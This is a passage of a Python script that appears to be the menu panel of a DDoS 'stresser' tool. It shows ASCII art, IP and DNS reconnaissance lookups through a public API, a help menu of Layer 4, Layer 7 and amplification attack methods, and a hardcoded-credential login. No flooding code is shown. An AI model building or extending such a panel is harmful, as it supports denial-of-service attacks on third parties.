                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS69')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "G404"
    passwd = "KALI"
    username = input("🤡 Username: ")
    password = getpass.getpass(prompt='🤡 Password: ')
    if username != user or password != passwd:
        print("")
        print("🤡 anda belum beruntung : v")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚬🤡 SELAMAT DATANG DI KONDOM BOCOR")
        time.sleep(0.8)
        ascii_vro()
        main()

login()
